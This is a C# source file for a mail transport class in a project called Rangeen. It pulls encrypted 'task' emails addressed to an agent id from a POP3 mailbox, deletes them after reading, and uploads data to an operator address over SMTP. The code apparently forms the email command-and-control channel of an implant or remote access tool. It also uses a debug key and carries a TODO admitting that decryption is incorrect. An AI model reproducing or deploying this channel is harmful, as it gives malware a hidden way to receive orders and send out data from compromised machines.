using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using ActiveUp.Net.Mail;
using UtilsLib;

namespace Rangeen.Transport
{
    public class MailTransport : ITransport
    {
        private readonly string _pop3Server;
        private readonly string _smtpServer;

        private readonly int _pop3Port;
        private readonly int _smtpPort;

        private readonly string _pop3Login;
        private readonly string _pop3Password;

        private readonly string _smtpLogin;
        private readonly string _smtpPassword;

        /// <summary>
        /// Constructor
        /// </summary>
        public MailTransport(string[] args)
        {
            try
            {
                if (args.Length < 8)
                    throw new Exception();

                foreach (var parts in args.Select(arg => arg.Split(':')))
                {
                    switch (parts[0])
                    {
                        case "pop3":
                            _pop3Server = parts[1];
                            break;
                        case "smtp":
                            _smtpServer = parts[1];
                            break;
                        case "pop3port":
                            _pop3Port = int.Parse(parts[1]);
                            break;
                        case "smtpport":
                            _smtpPort = int.Parse(parts[1]);
                            break;
                        case "pop3login":
                            _pop3Login = parts[1];
                            break;
                        case "pop3password":
                            _pop3Password = parts[1];
                            break;
                        case "smtplogin":
                            _smtpLogin = parts[1];
                            break;
                        case "smtppassword":
                            _smtpPassword = parts[1];
                            break;
                        default:
                            throw new Exception();
                    }
                }

            }
            catch (Exception)
            {
                
                throw new Exception("MailTransport Constructor: bad input parameter");
            }
        }

        public List<byte[]> Download()
        {
            var pop3Client = new Pop3Client();
            var downloaded = new List<byte[]>();

            pop3Client.ConnectSsl(_pop3Server, _pop3Port, _pop3Login, _pop3Password);

            for (int i = 1; i < pop3Client.MessageCount; i++)
            {
                var mail = pop3Client.RetrieveMessageObject(i);
                var subject = Cryptor.Decrypt(mail.Subject.GetBytes(), Cryptor.DEBUG_key);

                if (subject != null && subject.GetString() == Program.Config.AgentId) // TODO: correct decrypt mail subject
                {
                    downloaded.Add(mail.BodyText.Text.GetBytes());
                    pop3Client.DeleteMessage(i); // delete readed mail with task
                }
            }

            pop3Client.Disconnect();

            return downloaded;
        }

        /// <summary>
        /// Send mail from _smtpLogin to _pop3Login
        /// </summary>
        public bool Upload(byte[] binData, byte[] subject)
        {
            bool sended = false;
            const int maxRetries = 3;
            int retries = 0;

            while (sended == false && retries < maxRetries) // way to avoid "Smtp login is busy"
                try
                {
                    retries++;
                    sended = true;
                    var mail = new MailMessage(_smtpLogin, _pop3Login);
                    var client = new SmtpClient
                    {
                        Port = _smtpPort,
                        DeliveryMethod = SmtpDeliveryMethod.Network,
                        UseDefaultCredentials = false,
                        Host = _smtpServer,
                        EnableSsl = true,
                        Credentials = new System.Net.NetworkCredential(_smtpLogin, _smtpPassword)
                    };
                    mail.Subject = subject.GetString();
                    mail.Body = binData.GetString();
                    client.Send(mail);
                    client.Dispose();
                }
                catch (SmtpException)
                {
                    sended = false;
                }

            return sended;
        }

    }
}